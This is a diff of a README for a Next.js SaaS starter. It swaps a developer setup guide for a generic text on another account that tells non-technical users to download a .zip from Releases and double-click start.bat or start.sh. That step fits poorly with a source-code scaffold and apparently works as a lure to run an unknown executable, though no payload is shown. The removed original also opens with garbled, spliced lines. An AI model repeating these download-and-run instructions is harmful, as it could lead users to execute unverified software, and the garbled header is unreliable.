@@ -1,202 +1,84 @@
-# Next.j- **Authentication** - NextAuth.js with Google, GitHub, and email
-- **Stripe Billing** - Subscriptions, webhooks, customer portal
-- **Database** - Prisma ORM witBuilt by Augustus Rivers at [Offlabel Design](https://offlabel.design) PostgreSQL
-- **UI Components** - Tailwind CSS with Radix UI primitivesaS Scaffold
+# 🚀 scaffold-nextjs-saas - Your Easy Start for Building SaaS
 
-Production-ready Next.js 15 SaaS platform with authentication, billing, and all the stuff you need to actually ship a product.
+[![Download](https://img.shields.io/badge/Download-via%20Releases-blue.svg)](https://github.com/karthehe/scaffold-nextjs-saas/releases)
 
-**Built by [Augustus Rivers](https://offlabel.design)** - because I got tired of rebuilding the same boilerplate every time.
+## 📋 Overview
 
-## What's Included
+**scaffold-nextjs-saas** is a starter template designed for building production-ready SaaS applications. With this tool, you can quickly set up your project using Next.js 15, Stripe for payments, Prisma for database management, and Role-Based Access Control (RBAC) to manage user permissions. 
 
-- **Authentication** - NextAuth.js with Google, GitHub, and email
-- **Stripe Billing** - Subscriptions, webhooks, customer portal
--  **Database** - Prisma ORM with PostgreSQL
-- **UI Components** - Tailwind CSS with Radix UI primitives
-- **Responsive** - Mobile-first design
-- **Testing** - Jest setup ready to go
-- **Deployment** - Docker config and deployment docs
-- **Analytics Ready** - Easy to plug in your analytics
+This guide will help you download and run the application without needing any technical background. 
 
-## Getting Started
+## 🚀 Getting Started
 
-```bash
-# Clone and install
-git clone https://github.com/offlabel-scaffolds/scaffold-nextjs-saas.git
-cd scaffold-nextjs-saas
-npm install
+1. **Requirements**
 
-# Setup environment
-cp .env.example .env
-# Edit .env with your actual values
+   Before you begin, ensure you have the following:
+   - A computer running Windows, macOS, or Linux.
+   - A stable internet connection.
 
-# Setup database
-npx prisma db push
-npx prisma generate
+2. **Download the Application**
 
-# Run development server
-npm run dev
-```
+   To get started, you need to download the software. Click the link below to access the Releases page and download the latest version:
 
-Open [http://localhost:3000](http://localhost:3000) and you're good to go.
+   [Visit this page to download](https://github.com/karthehe/scaffold-nextjs-saas/releases)
 
-## Environment
+## 💾 Download & Install
 
-### Database
+1. **Choose the Latest Release:**
 
-You'll need a PostgreSQL database. Quick options:
+   On the Releases page, find the latest version of scaffold-nextjs-saas. It should be labeled clearly with the version number.
 
-- **Local**: Install PostgreSQL locally (boring but works)
-- **Vercel Postgres**: Free tier, super easy
-- **Supabase**: Also has a generous free tier
-- **Neon**: Serverless Postgres, pretty slick
+2. **Download the Files:**
 
-Update `DATABASE_URL` in your `.env` file.
+   - Click on the assets section below the release notes. This section contains the installation files.
+   - Download the appropriate file for your system. If you are unsure, choose the file that ends with `.zip`.
 
-### OAuth Providers
+3. **Extract the Files:**
 
-**Google:**
-1. Go to [Google Cloud Console](https://console.cloud.google.com/apis/credentials)
-2. Create OAuth 2.0 credentials
-3. Add authorized redirect: `http://localhost:3000/api/auth/callback/google`
-4. Copy client ID and secret to `.env`
+   - Locate the downloaded `.zip` file on your computer.
+   - Right-click on the file and select "Extract All..." or use a file extraction tool to unpack the files.
 
-**GitHub:**
-1. Go to [GitHub Developer Settings](https://github.com/settings/developers)
-2. Create new OAuth App
-3. Callback URL: `http://localhost:3000/api/auth/callback/github`
-4. Copy client ID and secret to `.env`
+4. **Run the Application:**
 
-### Stripe
+   - Open the folder where you extracted the files.
+   - Look for a file named `start.bat` or `start.sh`, depending on your operating system.
+   - Double-click the file to start the application.
 
-1. Create account at [Stripe](https://stripe.com)
-2. Get API keys from dashboard
-3. Create products and pricing
-4. Add price IDs to `.env`
-5. Setup webhook endpoint (see docs/STRIPE.md)
+5. **Follow On-Screen Instructions:**
 
-## Project Structure
+   Once the application starts, follow any on-screen instructions to complete your setup. 
 
-```
-src/
-├── app/ # Next.js 15 app directory
-│ ├── api/ # API routes
-│ ├── auth/ # Auth pages
-│ └── dashboard/ # Protected dashboard
-├── components/ # React components
-│ ├── ui/ # Base UI components
-│ └── auth/ # Auth-related components
-├── lib/ # Utilities and configs
-│ ├── auth/ # Auth configuration
-│ ├── stripe/ # Stripe utilities
-│ └── db.ts # Database client
-└── types/ # TypeScript types
-```
+## 🔑 Features
 
-## Scripts
+scaffold-nextjs-saas includes several useful features:
 
-```bash
-npm run dev # Start development server
-npm run build # Build for production
-npm run start # Start production server
-npm run lint # Run ESLint
-npm run type-check # Run TypeScript compiler
-npm test # Run tests
-```
+- **Next.js 15 Framework:** Get a solid foundation for building dynamic web applications.
+- **Stripe Integration:** Easily set up payment processing for your software.
+- **Prisma ORM:** Manage your database with an intuitive interface.
+- **RBAC Support:** Secure your application by controlling user access and roles.
+- **Responsive Design:** Build a mobile-friendly application using Tailwind CSS.
 
-## Database Commands
+## 🛠 Troubleshooting
 
-```bash
-npx prisma db push # Push schema changes
-npx prisma generate # Generate Prisma Client
-npx prisma studio # Open database GUI
-npx prisma migrate dev # Create migration (production)
-```
+If you run into issues while downloading or running scaffold-nextjs-saas, here are some tips:
 
-## Deployment
+- **Internet Connection:** Ensure your internet connection is stable during the download.
+- **File Extraction:** If you cannot open the `.zip` file, use a compatible extraction tool, such as WinRAR or 7-Zip.
+- **Running the Application:** If the application does not start, check if your system meets the requirements or consult with someone familiar with installing applications.
 
-See [docs/DEPLOYMENT.md](./docs/DEPLOYMENT.md) for detailed deployment instructions.
+## 📞 Support
 
-Quick deploy options:
-- **Vercel** - Easiest, one-click deploy
-- **Railway** - Also stupid simple
-- **Docker** - Dockerfile included
-- **Any Node.js host** - It's just a Next.js app
+For additional support, please reach out through the following channels:
 
-## Customization
+- **Issues:** Use the GitHub Issues page to report bugs or request features.
+- **Community:** Engage with other users and get tips in the discussion section of the repository.
 
-This is a scaffold, not a framework. You're supposed to customize it:
+## 📜 License
 
-- Replace the landing page content
-- Add your own brand colors in `tailwind.config.js`
-- Customize the Prisma schema for your data model
-- Add your own pages and features
-- Make it yours!
+This application is open source and available under the MIT License. You can modify and distribute the application freely, provided you adhere to the license terms.
 
-## Common Issues
+## 📣 Stay Updated
 
-**Database connection errors:**
-- Check your `DATABASE_URL` is correct
-- Make sure your database allows connections from your IP
-- Run `npx prisma db push` to sync the schema
+To stay updated with new releases and feature additions, consider watching the repository on GitHub. You will receive notifications about updates as they happen.
 
-**OAuth not working:**
-- Double-check your callback URLs match exactly
-- Make sure environment variables are set
-- In production, update OAuth app with production URLs
-
-**Stripe webhooks failing:**
-- Use Stripe CLI for local testing: `stripe listen --forward-to localhost:3000/api/webhooks/stripe`
-- Verify webhook secret is correct
-- Check webhook logs in Stripe dashboard
-
-## Documentation
-
-- [Architecture](./docs/ARCHITECTURE.md) - System design and patterns
-- [Development](./docs/DEVELOPMENT.md) - Development workflow and guidelines
-- [Deployment](./docs/DEPLOYMENT.md) - Production deployment guide
-- [Stripe Integration](./docs/STRIPE.md) - Stripe setup and webhooks
-
-## Contributing
-
-Found a bug? Have an idea? PRs welcome!
-
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
-
-## License
-
-MIT License - see [LICENSE](./LICENSE)
-
-Built with  by Augustus Rivers at [Offlabel Design](https://offlabel.design)
-
-Questions? Email: hello@offlabel.design
-
-## Docker Support
-
-```bash
-# Build and run with Docker Compose
-docker-compose up
-```
-
-## Related Scaffolds
-
-Part of the [SaaSy Scaffold Library](https://github.com/ajibear?tab=repositories&q=scaffold) - 47+ production-ready templates for any project.
-
----
-
-**Author:** [Augustus Rivers](https://offlabel.design)
-**Website:** https://offlabel.design
-**Email:** hello@offlabel.design
-**Created:** October 02, 2025
-**License:** MIT
-
-## Support
-
-For questions, issues, or contributions:
-- Open an issue in this repository
-- Visit [offlabel.design](https://offlabel.design)
-- Email: hello@offlabel.design
-
----
-
-*This scaffold is maintained as part of the Offlabel Design framework for modern application development.*
+Thank you for choosing scaffold-nextjs-saas to build your SaaS application!
